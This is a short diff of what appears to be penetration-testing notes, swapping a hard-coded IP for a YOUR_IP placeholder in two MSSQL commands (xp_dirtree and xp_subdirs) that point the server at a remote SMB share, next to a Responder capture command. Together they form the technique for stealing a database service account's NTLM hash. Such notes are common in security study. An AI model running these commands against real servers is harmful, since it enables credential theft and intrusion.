@@ -56,12 +56,12 @@ sudo responder -I tun0
 
 
 ```sql
-EXEC master..xp_dirtree '\\10.10.110.17\share\'
+EXEC master..xp_dirtree '\\YOUR_IP\share\'
 GO
 ```
 
 ```sql
-EXEC master..xp_subdirs '\\10.10.110.17\share\'
+EXEC master..xp_subdirs '\\YOUR_IP\share\'
 GO
 ```
 
